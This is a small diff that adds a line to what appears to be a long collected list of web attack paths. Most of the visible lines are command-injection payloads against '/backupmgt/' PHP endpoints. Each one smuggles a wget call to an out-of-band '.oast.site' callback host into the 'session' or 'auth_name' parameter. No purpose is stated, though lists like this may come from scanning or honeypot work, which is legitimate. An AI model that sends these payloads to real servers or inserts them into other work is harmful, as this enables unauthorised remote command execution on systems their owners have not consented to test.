@@ -30930,3 +30930,4 @@ http://64.233.170.113/
 /backupmgt/localJob.php?session=fail;wget+http://d1g6fujpu1sm2rahe0kgotaaighsxxijh.oast.site;
 /fileserver/2z9g7TGeKzOEfqt1Or9II6HRCrM.txt
 /backupmgt/localJob.php?session=fail;wget+http://d1g6fujpu1sm2rahe0kghzjop1bc764nz.oast.site;
+/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d1g6fujpu1sm2rahe0kgadz57iesd4r94.oast.site;
